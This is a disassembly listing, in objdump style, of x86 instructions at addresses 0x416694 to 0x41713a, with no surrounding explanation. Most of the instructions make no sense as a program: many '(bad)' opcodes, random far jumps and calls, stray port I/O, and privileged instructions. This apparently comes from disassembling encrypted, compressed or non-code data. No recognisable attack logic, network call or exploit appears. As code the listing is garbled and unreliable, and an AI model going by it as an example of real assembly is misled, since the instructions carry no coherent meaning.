  416694:	jmp    0x2e18997c
  416699:	mov    ebp,0x520948a
  41669e:	sbb    eax,0xca4b8f13
  4166a3:	inc    ecx
  4166a4:	mov    ah,0x85
  4166a6:	dec    eax
  4166a7:	int    0xac
  4166a9:	mov    ebx,0x95b3cda
  4166ae:	cwde   
  4166af:	nop
  4166b0:	mov    dl,0x1e
  4166b2:	xor    DWORD PTR [edx],edx
  4166b4:	xchg   edx,eax
  4166b5:	pop    esi
  4166b6:	fist   WORD PTR cs:[esi+0x31]
  4166ba:	push   esp
  4166bb:	dec    ebp
  4166bc:	sbb    al,0xbd
  4166be:	adc    eax,0x1882db46
  4166c3:	mov    dl,BYTE PTR [ebp-0xa3be83f]
  4166c9:	or     ch,BYTE PTR [edx-0x1f59b872]
  4166cf:	cmp    DWORD PTR [eax-0x7c],0xf3d02f1e
  4166d6:	fldenv [ebp+edi*2-0x5a]
  4166da:	push   si
  4166dc:	pop    esi
  4166dd:	test   DWORD PTR cs:[edx+0x39c58f46],0x24410c74
  4166e8:	shl    BYTE PTR [edx+0x65],1
  4166eb:	dec    esp
  4166ec:	mov    ebx,0x5023d7eb
  4166f1:	repz call DWORD PTR [ebx+esi*8+0x7679e97f]
  4166f9:	mov    edi,0xa747c13a
  4166fe:	mov    ah,0x65
  416700:	mov    eax,ds:0xe5a77c9d
  416705:	(bad)  
  416706:	push   0xc19d676e
  41670b:	xor    BYTE PTR [edi+eiz*1+0x54],ah
  41670f:	inc    eax
	...
  416774:	(bad)  
  416775:	(bad)  
  416777:	(bad)  
  416778:	(bad)  
  41677a:	out    0xff,eax
  41677c:	sbb    edi,DWORD PTR [esp+ecx*2-0x3a]
  416780:	push   edi
  416781:	imul   eax,DWORD PTR [eax-0x7b],0xed48
  416788:	add    al,0x1
  41678a:	add    BYTE PTR [eax],al
  41678c:	mov    dl,0x89
  41678e:	std    
  41678f:	jae    0x4167ce
  416791:	sbb    eax,0xefc79874
  416796:	push   edi
  416797:	push   ecx
  416798:	(bad)  
  416799:	fidivr WORD PTR [edx+0x9]
  41679c:	repz jp 0x41681e
  41679f:	jae    0x4167ad
  4167a1:	dec    edx
  4167a3:	push   edx
  4167a4:	jno    0x416751
  4167a6:	xor    BYTE PTR [ecx+ebx*4-0x399fb1f8],bl
  4167ad:	cwde   
  4167ae:	cld    
  4167af:	inc    edx
  4167b0:	cld    
  4167b1:	ret    0x2292
  4167b4:	xor    dl,BYTE PTR [edi]
  4167b6:	mov    edx,DWORD PTR [edx+0xb]
  4167b9:	mov    eax,ds:0xbc4114ef
  4167be:	mov    ch,0x39
  4167c0:	mov    dh,0xc0
  4167c2:	aam    0x20
  4167c4:	into   
  4167c5:	scas   al,BYTE PTR es:[edi]
  4167c6:	fwait
  4167c7:	ss fs call 0x303c:0x34fc7a71
  4167d0:	dec    edi
  4167d1:	push   ds
  4167d2:	sbb    eax,0x6d5e2247
  4167d7:	mov    edi,0x303927fc
  4167dc:	jmp    0x416802
  4167de:	js     0x41676c
  4167e0:	jge    0x416773
  4167e2:	xchg   BYTE PTR [edi+0x5e85e1af],dh
  4167e8:	rol    BYTE PTR [edi],1
  4167ea:	push   esi
  4167eb:	or     dl,0xf9
  4167ee:	cmc    
  4167ef:	mov    eax,ds:0xe5ea74b1
  4167f4:	xchg   esp,eax
  4167f5:	sar    DWORD PTR [ebx],cl
  4167f7:	jge    0x41684b
  4167f9:	sbb    al,0x40
  4167fb:	mov    al,ds:0x5fc6ea4f
  416800:	pop    esp
  416801:	call   0x3d218b51
  416806:	xchg   edi,eax
  416807:	push   ss
  416808:	xchg   ebx,eax
  416809:	xor    BYTE PTR [eax+edi*8+0x65c89979],dl
  416810:	sub    cx,WORD PTR [ebx-0x2]
  416814:	add    BYTE PTR [ebp-0x27],bl
  416817:	and    dl,ch
  416819:	std    
  41681a:	inc    ebp
  41681b:	cdq    
  41681c:	stos   DWORD PTR es:[edi],eax
  41681d:	sahf   
  41681e:	inc    esp
  41681f:	retf   0x4759
  416822:	jmp    0x2084e3a8
  416827:	mov    WORD PTR [eax-0x6c037f58],cs
  41682d:	stos   DWORD PTR es:[edi],eax
  41682e:	sub    ch,dl
  416830:	outs   dx,BYTE PTR ds:[esi]
  416831:	and    al,0xba
  416833:	xchg   edx,eax
  416834:	mov    ah,0xb3
  416836:	fs inc ebp
  416838:	cmp    BYTE PTR [edx+0x58dc99f8],dh
  41683e:	sbb    BYTE PTR [esi+0x51a02294],0xfa
  416845:	mov    BYTE PTR [edx+0x329a8f93],dh
  41684b:	cld    
  41684c:	repnz xchg edx,eax
  41684e:	push   0xffffffd3
  416850:	je     0x4168b6
  416852:	mov    edi,DWORD PTR [eax+0x3989470e]
  416858:	ja     0x4167e1
  41685a:	icebp  
  41685b:	lea    ebx,[edi-0x4b]
  41685e:	push   ebx
  41685f:	mov    ah,0xf9
  416861:	int3   
  416862:	mov    bh,0xbb
  416864:	into   
  416865:	jo     0x4168c5
  416867:	push   ebp
  416868:	adc    DWORD PTR [edx+0x3c],0x3c8a6616
  41686f:	push   ebx
  416870:	jnp    0x4168a0
  416872:	daa    
  416873:	sbb    BYTE PTR [edi+ecx*2+0x708ad7e3],dh
  41687a:	mov    al,gs:0x5ab7f7c2
  416880:	mov    BYTE PTR [ecx-0x419246a1],dl
  416886:	push   0x16
  416888:	sbb    esi,DWORD PTR [ebp+eax*4-0x37c2518f]
  41688f:	sub    eax,DWORD PTR [eax]
	...
  4168f1:	add    BYTE PTR [eax],al
  4168f3:	add    cl,dl
  4168f5:	scas   eax,DWORD PTR es:[edi]
  4168f6:	push   es
  4168f7:	repz jle 0x4168f5
  4168fa:	cmc    
  4168fb:	scas   eax,DWORD PTR es:[edi]
  4168fc:	sub    DWORD PTR [edi-0x5d],edi
  4168ff:	mov    ebp,0xb950d5d4
  416904:	dec    esp
  416905:	out    dx,al
  416906:	add    BYTE PTR [eax],al
  416908:	add    al,0x1
  41690a:	add    BYTE PTR [eax],al
  41690c:	out    0x44,al
  41690e:	jge    0x416969
  416910:	xchg   edx,eax
  416911:	push   ss
  416912:	pop    ebp
  416913:	xor    DWORD PTR [edi+ebp*8+0x41],esi
  416917:	test   eax,0x9e280b43
  41691c:	aaa    
  41691d:	rol    DWORD PTR [eax+0x32],cl
  416920:	pop    esp
  416921:	adc    bh,BYTE PTR [ecx+0x309c7e75]
  416927:	mov    ch,0x5a
  416929:	(bad)  
  41692b:	dec    ebx
  41692c:	or     al,0x28
  41692e:	test   DWORD PTR [ebx],esi
  416930:	push   ebx
  416931:	mov    edx,ebx
  416933:	loope  0x41698e
  416935:	xor    DWORD PTR ds:0xcbdb2161,ebx
  41693b:	hlt    
  41693c:	jle    0x4168d9
  41693e:	and    bh,BYTE PTR [esi+0x41]
  416941:	dec    edi
  416942:	ins    DWORD PTR es:[edi],dx
  416943:	or     ebp,DWORD PTR [eax]
  416945:	mov    dh,0xd1
  416947:	mov    ?,WORD PTR [ebx-0x12c95e8a]
  41694d:	arpl   WORD PTR [eax+edi*8+0x4ad1d9b7],di
  416954:	add    eax,0x492241ee
  416959:	mov    ?,WORD PTR [eax+0x72]
  41695c:	mov    edx,DWORD PTR [eax]
  41695e:	cmp    BYTE PTR [edi+0x69],0x1b
  416962:	mov    ds:0x4c0be09a,eax
  416967:	fsqrt  
  416969:	packsswb mm0,QWORD PTR [eax-0x1656db69]
  416970:	loope  0x416954
  416972:	pushf  
  416973:	cdq    
  416974:	das    
  416975:	push   edi
  416976:	sub    eax,0xf1470829
  41697b:	lea    edx,[edi]
  41697d:	dec    edi
  41697e:	pop    ds
  41697f:	pop    eax
  416980:	retf   0xb7ed
  416983:	aas    
  416984:	jmp    DWORD PTR [edi]
  416986:	arpl   si,cx
  416988:	lods   eax,DWORD PTR ds:[esi]
  416989:	adc    ch,BYTE PTR [ebx-0xc]
  41698c:	(bad)  
  41698d:	imul   esp,DWORD PTR [ecx+ecx*8+0x6f],0xd14430e1
  416995:	xor    cl,ah
  416997:	mov    dh,0xb9
  416999:	in     eax,0x14
  41699b:	and    dl,ah
  41699d:	push   edi
  41699e:	data16 je 0x4169a2
  4169a1:	lods   al,BYTE PTR ds:[esi]
  4169a2:	ret    0x4299
  4169a5:	int    0x9d
  4169a7:	add    DWORD PTR ds:0x4d68a36f,0xffffff8f
  4169ae:	out    0x25,eax
  4169b0:	mov    ds:0xa7f0738f,al
  4169b5:	cmp    BYTE PTR [ebx],dh
  4169b7:	sub    dh,BYTE PTR [esi+0x76]
  4169ba:	lahf   
  4169bb:	imul   edi,DWORD PTR [edx+0x1f],0xffffffbc
  4169bf:	mov    al,0x61
  4169c2:	pop    edi
  4169c3:	push   esp
  4169c4:	call   0x4c3b3b49
  4169c9:	mov    dh,0x3e
  4169cb:	push   0x7db686a5
  4169d0:	repnz in al,dx
  4169d2:	lea    ecx,[ebp+0x63d7ab0c]
  4169d8:	loopne 0x416a14
  4169da:	adc    esp,0xffffffbe
  4169dd:	jns    0x416a33
  4169df:	jo     0x4169d1
  4169e1:	cmp    eax,0x15f5d79c
  4169e6:	lds    ebx,FWORD PTR [ecx]
  4169e8:	cs cmpxchg esp,ebp
  4169ec:	xchg   edi,eax
  4169ed:	dec    ebx
  4169ee:	xor    BYTE PTR [ebx+0x7239ed9a],ah
  4169f4:	mov    esp,0x99916092
  4169f9:	and    bl,BYTE PTR [eax+0x66f72a8f]
  4169ff:	out    0xcf,eax
  416a01:	in     eax,0xda
  416a03:	jb     0x416a7c
  416a05:	imul   esp,DWORD PTR [eax+0x259d9f3b],0x29
  416a0c:	push   ds
  416a0d:	add    al,0x31
  416a0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  416a74:	retf   
  416a75:	pusha  
  416a76:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  416a7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a7d:	mov    al,ds:0xb6f30ba3
  416a82:	and    BYTE PTR [edx+0x50],0xef
  416a86:	add    BYTE PTR [eax],al
  416a88:	add    al,0x1
  416a8a:	add    BYTE PTR [eax],al
  416a8c:	xor    eax,0x7b5ae55a
  416a91:	adc    al,0xf1
  416a93:	xchg   esp,eax
  416a94:	cmp    ebx,ebp
  416a96:	xor    al,0x30
  416a98:	jae    0x416b0a
  416a9a:	lock lock pop esp
  416a9d:	rcr    DWORD PTR [si],0xb4
  416aa1:	inc    esi
  416aa2:	sub    BYTE PTR [edi+0x218596f6],bl
  416aa8:	imul   esi,DWORD PTR [ebx-0x1ca79628],0xffffffb1
  416aaf:	mov    ah,0x30
  416ab1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ab2:	mov    ds:0x43baad2b,al
  416ab7:	mov    dl,0xac
  416ab9:	or     ebx,DWORD PTR [edx+eiz*1-0x6b]
  416abd:	sbb    al,0x81
  416abf:	dec    edx
  416ac0:	aam    0x53
  416ac2:	mov    bl,0xcd
  416ac4:	test   al,0x9b
  416ac6:	fsubp  st(7),st
  416ac8:	icebp  
  416ac9:	cmp    al,0x1a
  416acb:	and    BYTE PTR [ebx],ch
  416acd:	pop    esp
  416ace:	fisubr DWORD PTR [eax]
  416ad0:	out    dx,eax
  416ad1:	aaa    
  416ad2:	pop    ecx
  416ad3:	out    0xc4,eax
  416ad5:	sbb    BYTE PTR [esi],0x66
  416ad8:	scas   al,BYTE PTR es:[edi]
  416ad9:	jl     0x416ab2
  416adb:	adc    bl,ch
  416add:	adc    BYTE PTR [ebx+eiz*2],ah
  416ae0:	mov    esp,DWORD PTR [edx-0x26]
  416ae3:	cmp    eax,0xc7f717ba
  416ae8:	and    DWORD PTR [ebp-0x4],0x6cc88000
  416aef:	loopne 0x416b1f
  416af1:	jmp    0x363f:0xd9ef7c2f
  416af8:	xor    ecx,DWORD PTR [edx-0x64]
  416afb:	and    ebx,ebx
  416afd:	(bad)  
  416afe:	dec    edi
  416aff:	or     BYTE PTR [edx],0x8b
  416b02:	xchg   ebx,eax
  416b03:	aam    0x62
  416b05:	daa    
  416b06:	cld    
  416b07:	dec    ecx
  416b08:	ja     0x416aa1
  416b0a:	mov    esp,0xafbeb002
  416b0f:	dec    esp
  416b10:	fbstp  TBYTE PTR [esi]
  416b12:	outs   dx,BYTE PTR ds:[esi]
  416b13:	ins    BYTE PTR es:[edi],dx
  416b14:	xor    BYTE PTR [edx-0x439f3055],al
  416b1a:	sbb    eax,0x1723795f
  416b1f:	sbb    DWORD PTR [esp+esi*2+0x1e60c370],esp
  416b26:	pcmpgtb mm7,mm0
  416b29:	cmp    eax,0xcb98b4b5
  416b2e:	fninit 
  416b30:	pop    esi
  416b31:	xlat   BYTE PTR es:[ebx]
  416b33:	push   eax
  416b34:	dec    esp
  416b35:	or     al,BYTE PTR [edx]
  416b37:	pop    esp
  416b38:	(bad)  
  416b39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b3a:	imul   edi,DWORD PTR [ebp-0x31c2bbe7],0x6918cd0f
  416b44:	mov    BYTE PTR [edx-0x68],ah
  416b47:	mov    al,0x47
  416b49:	ja     0x416afb
  416b4b:	cli    
  416b4c:	mov    ebp,0x97f77bf4
  416b51:	test   ch,ah
  416b53:	loope  0x416b01
  416b55:	xor    eax,DWORD PTR [ecx-0x26568154]
  416b5b:	pop    ebp
  416b5c:	sub    al,0xe7
  416b5e:	pop    edx
  416b5f:	(bad)  [ebp+0x2f45638b]
  416b65:	mov    bh,0xc2
  416b67:	dec    eax
  416b68:	clc    
  416b69:	adc    eax,0x5dbd7bdb
  416b6e:	jl     0x416bac
  416b70:	dec    ebx
  416b71:	mov    ebp,0xe3711c86
  416b76:	sbb    eax,0xa543a72c
  416b7b:	push   edx
  416b7c:	sub    eax,0x43a64b5d
  416b81:	push   ecx
  416b82:	mov    ds:0xa1c2fa0f,eax
  416b87:	cmp    dl,BYTE PTR [ebx+0x31]
  416b8a:	in     eax,0xf3
  416b8c:	dec    ecx
  416b8d:	cmp    eax,0x331a
	...
  416bf2:	add    BYTE PTR [eax],al
  416bf4:	jecxz  0x416c5b
  416bf6:	push   cs
  416bf7:	test   DWORD PTR [esi-0x38a0401],0x6b5b70a9
  416c01:	xchg   esi,eax
  416c02:	adc    dh,BYTE PTR [edx]
  416c04:	push   esp
  416c05:	lock add BYTE PTR [eax],al
  416c08:	add    al,0x1
  416c0a:	add    BYTE PTR [eax],al
  416c0c:	ins    BYTE PTR es:[edi],dx
  416c0d:	fild   QWORD PTR [edi]
  416c0f:	inc    edi
  416c10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c11:	les    esp,FWORD PTR [ebp+0x65]
  416c14:	sub    eax,0xbc202276
  416c19:	sbb    edi,DWORD PTR [ecx+0x4b8566c]
  416c1f:	ret    0x8f13
  416c22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c23:	enter  0x2b95,0xf
  416c27:	leave  
  416c28:	dec    edi
  416c29:	lods   al,BYTE PTR ds:[esi]
  416c2a:	(bad)  
  416c2b:	mov    eax,0xd8819308
  416c30:	test   DWORD PTR ds:0xafceeac0,0xb2117633
  416c3b:	shr    BYTE PTR [edi-0x4c1e7959],cl
  416c41:	add    ch,bh
  416c43:	fbld   TBYTE PTR [edx+0x2c]
  416c46:	xor    BYTE PTR [edx+ebx*1-0x4b],al
  416c4a:	mov    esi,0xdf6ea275
  416c4f:	mov    edx,0x39c5c0e0
  416c54:	cmp    bl,al
  416c56:	push   0x46
  416c58:	and    esp,ebx
  416c5a:	outs   dx,BYTE PTR ds:[esi]
  416c5b:	cmp    al,bl
  416c5d:	mov    edi,edi
  416c5f:	scas   al,BYTE PTR es:[edi]
  416c60:	xor    DWORD PTR [eax+0x2c],edi
  416c63:	mov    ch,0xb0
  416c65:	inc    ebx
  416c66:	sbb    eax,0x7dc34e84
  416c6b:	rcl    DWORD PTR [esi+0x645155ed],1
  416c71:	and    DWORD PTR [eax],0xe23163c7
  416c77:	sbb    eax,0x2e31a3d7
  416c7c:	ins    DWORD PTR es:[edi],dx
  416c7d:	mov    DWORD PTR [ebx+esi*2+0x10fa2c43],eax
  416c84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c85:	push   ebx
  416c86:	ds or  eax,0xe6ca65d4
  416c8c:	adc    DWORD PTR [eax+eax*2],ecx
  416c8f:	daa    
  416c90:	sbb    al,bh
  416c92:	or     dl,bh
  416c94:	fcmovbe st,st(6)
  416c96:	outs   dx,BYTE PTR ds:[esi]
  416c97:	lock je 0x416d03
  416c9a:	ja     0x416c86
  416c9c:	push   ecx
  416c9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c9e:	mov    edx,0x9d0086d5
  416ca3:	call   0xcab2:0x2dfc3753
  416caa:	dec    ecx
  416cab:	addr16 call 0xace0:0x654576fd
  416cb3:	in     eax,0x52
  416cb5:	inc    ebp
  416cb6:	loope  0x416c49
  416cb8:	ja     0x416cf7
  416cba:	in     al,dx
  416cbb:	mov    edi,DWORD PTR ds:0xa33b550f
  416cc1:	clc    
  416cc2:	mov    ecx,0xd50b468c
  416cc7:	dec    ecx
  416cc8:	or     DWORD PTR [eax],esi
  416cca:	pop    esi
  416ccb:	mov    edi,DWORD PTR [edi+0x2a]
  416cce:	mov    BYTE PTR [esi-0x7a],cl
  416cd1:	and    dl,bl
  416cd3:	es adc al,0x4d
  416cd6:	pop    ebx
  416cd7:	cs data16 (bad) 
  416cdb:	push   0x46
  416cdd:	adc    eax,0x423f2147
  416ce2:	sub    edx,ebx
  416ce4:	ret    
  416ce5:	mov    dh,0x4
  416ce7:	push   esp
  416ce8:	push   ebp
  416ce9:	bound  edi,QWORD PTR [esi-0x3d]
  416cec:	fisttp QWORD PTR [eax]
  416cee:	cmp    BYTE PTR [edi+0x6f808e8c],ah
  416cf4:	sub    BYTE PTR [ebp+0x6c],al
  416cf7:	xchg   ebp,eax
  416cf8:	test   eax,0x8dcc25ce
  416cfd:	jmp    0x2c4d:0xaa80da12
  416d04:	daa    
  416d05:	jl     0x416d44
  416d07:	int    0x2f
  416d09:	in     eax,dx
  416d0a:	pop    ss
  416d0b:	leave  
  416d0c:	xchg   ebp,eax
  416d0d:	test   al,0xb7
  416d0f:	fild   WORD PTR [eax]
	...
  416d71:	add    BYTE PTR [eax],al
  416d73:	add    BYTE PTR [ecx],ah
  416d75:	xchg   ebx,eax
  416d76:	mov    DWORD PTR [edi-0x60d84045],ebp
  416d7c:	mov    ch,0x99
  416d7e:	pop    edx
  416d7f:	das    
  416d80:	and    eax,eax
  416d82:	jo     0x416dab
  416d84:	pop    eax
  416d85:	icebp  
  416d86:	add    BYTE PTR [eax],al
  416d88:	add    al,0x1
  416d8a:	add    BYTE PTR [eax],al
  416d8c:	cwde   
  416d8d:	cmp    ebx,DWORD PTR [eax-0x3e]
  416d90:	xchg   ebp,edx
  416d92:	ret    0x96ec
  416d95:	scas   al,BYTE PTR es:[edi]
  416d96:	or     BYTE PTR [eax+0x63],0x6d
  416d9a:	fbstp  TBYTE PTR [edi]
  416d9c:	mov    al,ds:0x47399661
  416da1:	pushf  
  416da2:	ficomp WORD PTR [ecx+0x55]
  416da5:	ret    
  416da6:	das    
  416da7:	ds jb  0x416e0a
  416daa:	in     al,dx
  416dab:	mov    eax,0x425e026a
  416db0:	push   eax
  416db1:	mov    BYTE PTR [eax-0x3a5840c6],bl
  416db7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416db8:	and    DWORD PTR [edx],ecx
  416dba:	cdq    
  416dbb:	daa    
  416dbc:	test   ebx,0x89140cf3
  416dc2:	push   es
  416dc3:	ja     0x416dc4
  416dc5:	mov    dh,0xef
  416dc7:	scas   al,BYTE PTR es:[edi]
  416dc8:	aam    0xee
  416dca:	or     bh,BYTE PTR [ebp+0x57]
  416dcd:	dec    esi
  416dce:	xchg   edi,eax
  416dcf:	pop    esi
  416dd0:	adc    BYTE PTR [ecx-0x2900e478],dh
  416dd6:	out    dx,eax
  416dd7:	xor    al,0xce
  416dd9:	mov    ah,0xa7
  416ddb:	enter  0xa5f7,0x70
  416ddf:	dec    edi
  416de0:	ds jmp 0x95a6:0x88abb9e9
  416de8:	into   
  416de9:	add    esp,esp
  416deb:	fs je  0x416d7f
  416dee:	mov    cl,0xe1
  416df0:	push   edi
  416df1:	mov    edi,0xdff771dd
  416df6:	lahf   
  416df7:	mov    bh,0x83
  416df9:	push   0xa5989fbb
  416dfe:	cmp    DWORD PTR [esi-0x72],edx
  416e01:	adc    DWORD PTR [edi-0x2c],ebx
  416e04:	daa    
  416e05:	mov    edi,0x585dc4a3
  416e0a:	mov    ds:0x31eec5d,al
  416e0f:	pop    edi
  416e10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e11:	les    edi,FWORD PTR [edx]
  416e13:	add    eax,0x6f6d87aa
  416e18:	cmc    
  416e19:	xlat   BYTE PTR ds:[ebx]
  416e1a:	cmp    bh,BYTE PTR [edi]
  416e1c:	or     cl,BYTE PTR ds:0x39d15f33
  416e22:	cdq    
  416e23:	bound  esi,QWORD PTR [ebx+ecx*8]
  416e26:	sub    esi,DWORD PTR [esi]
  416e28:	mov    eax,0xa7adc32f
  416e2d:	mov    eax,0xdcf02ece
  416e32:	mov    es,eax
  416e34:	mov    WORD PTR [edi+0x17],?
  416e37:	ja     0x416e9a
  416e39:	arpl   WORD PTR [ebx-0x533db581],bp
  416e3f:	mov    DWORD PTR [edi+ecx*8-0x4a8e1276],esi
  416e46:	fsub   st,st(4)
  416e48:	pop    edx
  416e49:	pop    esp
  416e4a:	xchg   DWORD PTR [edx+0x4c],eax
  416e4d:	std    
  416e4e:	cs push es
  416e50:	sbb    DWORD PTR [esp+edi*4],ebx
  416e53:	outs   dx,DWORD PTR ds:[esi]
  416e54:	jl     0x416ed2
  416e56:	mov    edi,0x91595906
  416e5b:	pop    es
  416e5c:	daa    
  416e5d:	das    
  416e5e:	adc    dl,dl
  416e60:	dec    ebx
  416e61:	xor    DWORD PTR [esi+eax*4+0xe],edi
  416e65:	add    ebx,ebx
  416e67:	pushf  
  416e68:	(bad)
  416e6b:	out    0xb5,al
  416e6d:	imul   edx,ebx,0xc8c25547
  416e73:	lock mov ebx,0x2aef0b56
  416e79:	mov    ch,al
  416e7b:	pop    ss
  416e7c:	iret   
  416e7d:	repnz xchg ecx,eax
  416e7f:	rcl    BYTE PTR [ebp+0x2],cl
  416e82:	imul   edi,DWORD PTR ds:0x5bf936b9,0x5e77d3fe
  416e8c:	mov    eax,ds:0x80f1d0
	...
  416ef1:	add    BYTE PTR [eax],al
  416ef3:	add    BYTE PTR [edi-0x519271e7],bh
  416ef9:	(bad)  
  416efa:	(bad)  
  416efb:	fucomi st,st(0)
  416efd:	xor    eax,0xe6578eea
  416f02:	pushf  
  416f03:	push   0x5c
  416f05:	repnz add BYTE PTR [eax],al
  416f08:	add    al,0x1
  416f0a:	add    BYTE PTR [eax],al
  416f0c:	shl    BYTE PTR [eax+0x142d9f77],1
  416f12:	jecxz  0x416ea9
  416f14:	aam    0xed
  416f16:	fistp  QWORD PTR [esp+ecx*1-0x27b42ce0]
  416f1d:	mov    esp,DWORD PTR [edi-0x35]
  416f20:	daa    
  416f21:	imul   ebx,ebp,0xe0057834
  416f27:	ja     0x416eb2
  416f29:	add    al,0x7f
  416f2b:	shr    DWORD PTR [ebp-0x24],cl
  416f2e:	mov    eax,ds:0x23225b20
  416f33:	fimul  WORD PTR [ecx-0x1a]
  416f36:	shr    BYTE PTR [edi],0xe4
  416f39:	mov    dl,0x2
  416f3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f3c:	fwait
  416f3d:	out    0x93,eax
  416f3f:	dec    edi
  416f40:	inc    edi
  416f41:	clc    
  416f42:	retf   
  416f43:	pmaxsw mm6,QWORD PTR [ebx+0x2ce0e827]
  416f4a:	mov    ah,0xf4
  416f4c:	std    
  416f4d:	and    eax,DWORD PTR ds:0x3e3393f5
  416f53:	push   DWORD PTR [ebp-0x31d383a8]
  416f59:	mov    al,0x25
  416f5b:	jmp    0xe36cec8c
  416f60:	inc    ecx
  416f61:	scas   al,BYTE PTR es:[edi]
  416f62:	icebp  
  416f63:	push   esp
  416f64:	fistp  WORD PTR [esi-0x70eb96d7]
  416f6a:	pop    eax
  416f6b:	jno    0x416f2c
  416f6d:	dec    edx
  416f6e:	loop   0x416fa4
  416f70:	or     al,0xbe
  416f72:	fimul  WORD PTR [ecx+0x79]
  416f75:	or     eax,0x61e33b9f
  416f7a:	lea    esi,[ebx-0x64]
  416f7d:	inc    esi
  416f7e:	mov    bl,0x8
  416f80:	xor    DWORD PTR [edi+0x80bccfa],ebx
  416f86:	daa    
  416f87:	leave  
  416f88:	mov    edi,0x780cf0c6
  416f8d:	pusha  
  416f8e:	sub    eax,0xebef0cec
  416f93:	xchg   edi,eax
  416f94:	and    edi,DWORD PTR [esi-0x37]
  416f97:	pop    edx
  416f98:	jo     0x416f44
  416f9a:	add    cl,BYTE PTR [eax+0x4b5eec12]
  416fa0:	jne    0x417011
  416fa2:	jge    0x416fb9
  416fa4:	aaa    
  416fa5:	mov    bl,0x8e
  416fa7:	lock fld QWORD PTR [ebx]
  416faa:	es nop
  416fac:	pop    eax
  416fad:	or     edi,DWORD PTR [edi]
  416faf:	sub    DWORD PTR [edi-0x53],0xffffffda
  416fb3:	dec    esp
  416fb4:	cmp    al,0x86
  416fb6:	retf   
  416fb7:	fs in  eax,dx
  416fb9:	lods   al,BYTE PTR ds:[esi]
  416fba:	ret    
  416fbb:	pusha  
  416fbc:	rcr    DWORD PTR [edx+0x5b],1
  416fbf:	mov    esp,0x78ff0527
  416fc4:	ja     0x416fc2
  416fc6:	jae    0x416fea
  416fc8:	outs   dx,DWORD PTR ds:[esi]
  416fc9:	or     eax,0x67019c1a
  416fce:	jb     0x416fab
  416fd0:	inc    eax
  416fd1:	mov    bl,0x8c
  416fd3:	push   0xffffffbb
  416fd5:	(bad)  [esi+0x472987c1]
  416fdb:	rcl    DWORD PTR [esi+0x5d],0xac
  416fdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416fe0:	inc    ebp
  416fe1:	jae    0x41703f
  416fe3:	nop
  416fe4:	xchg   esp,eax
  416fe5:	cmc    
  416fe6:	stos   BYTE PTR es:[edi],al
  416fe7:	call   DWORD PTR [ebx+edx*1]
  416fea:	mov    ebp,0xe5ea7bff
  416fef:	ds es out 0xd1,al
  416ff3:	(bad)  
  416ff5:	adc    al,0x26
  416ff7:	pop    es
  416ff8:	jp     0x417022
  416ffa:	mov    edi,0xcc6f182a
  416fff:	mov    ebp,0xeae5fa1b
  417004:	int    0x76
  417006:	xor    BYTE PTR [edi-0x3],al
  417009:	icebp  
  41700a:	inc    esp
  41700b:	mov    gs,WORD PTR [edi+ebx*2+0xea36]
	...
  417072:	add    BYTE PTR [eax],al
  417074:	jbe    0x4170a3
  417076:	push   ebp
  417077:	inc    ecx
  417078:	pop    edi
  417079:	jns    0x4170f1
  41707b:	aas    
  41707c:	(bad)  
  41707d:	loopne 0x417073
  41707f:	sub    edx,DWORD PTR ds:0x6019e203
  417085:	repz add BYTE PTR [eax],al
  417088:	add    al,0x1
  41708a:	add    BYTE PTR [eax],al
  41708c:	mov    eax,0xd0269b18
  417091:	inc    edi
  417092:	sbb    dh,BYTE PTR [esi]
  417094:	and    eax,0x8ba680
  417099:	jno    0x4170f0
  41709b:	mov    ecx,0xff9a3705
  4170a0:	xor    al,0xb4
  4170a2:	adc    ebx,ebx
  4170a4:	retf   
  4170a5:	in     eax,0x94
  4170a7:	pusha  
  4170a8:	div    DWORD PTR [ebx+0xfab8ef7]
  4170ae:	or     BYTE PTR [ecx-0x3954142a],ah
  4170b4:	das    
  4170b5:	and    al,0x9a
  4170b7:	mov    al,BYTE PTR [ebx]
  4170b9:	fdiv   DWORD PTR [esi-0x74]
  4170bc:	dec    eax
  4170bd:	push   0xffffffa5
  4170bf:	stos   BYTE PTR es:[edi],al
  4170c0:	jmp    0x3650:0x7fda5836
  4170c7:	pop    eax
  4170c8:	out    dx,al
  4170c9:	int    0x93
  4170cb:	jp     0x41712a
  4170cd:	fcmovnb st,st(0)
  4170cf:	xchg   edi,eax
  4170d0:	add    DWORD PTR [eax-0x31],edi
  4170d3:	and    BYTE PTR [edi+0x59],bl
  4170d6:	aam    0x80
  4170d8:	int3   
  4170d9:	mov    bp,0xa5aa
  4170dd:	and    al,0x8c
  4170df:	jle    0x41709b
  4170e1:	push   edi
  4170e2:	cmp    BYTE PTR gs:[ebx],0x5c
  4170e6:	sub    eax,0xa06d5432
  4170eb:	in     eax,0xfb
  4170ed:	or     dl,BYTE PTR [edi-0x4200c33e]
  4170f3:	cmp    ebp,0x9ce7812e
  4170f9:	mov    ebx,0x36dd66e4
  4170fe:	sub    BYTE PTR [eax-0x64],0x7e
  417102:	outs   dx,BYTE PTR ds:[esi]
  417103:	dec    esi
  417104:	(bad)  
  417105:	addr16 push eax
  417107:	icebp  
  417108:	shl    BYTE PTR [eax+ebx*1],0xe1
  41710c:	stc    
  41710d:	lods   al,BYTE PTR ds:[esi]
  41710e:	and    ch,BYTE PTR ds:0xc6fe2677
  417114:	jne    0x417178
  417116:	jmp    0x33ef3ab
  41711b:	imul   eax,esi,0xffffff85
  41711e:	pop    es
  41711f:	or     ch,0xd4
  417122:	iret   
  417123:	(bad)  
  417124:	and    al,0x41
  417126:	sub    bl,BYTE PTR [esi-0x2dbe164e]
  41712c:	mov    esi,?
  41712e:	lods   eax,DWORD PTR ds:[esi]
  41712f:	loope  0x4170b3
  417131:	test   esi,0x4f796727
  417137:	or     bp,WORD PTR [esi]
  41713a:	push   ds
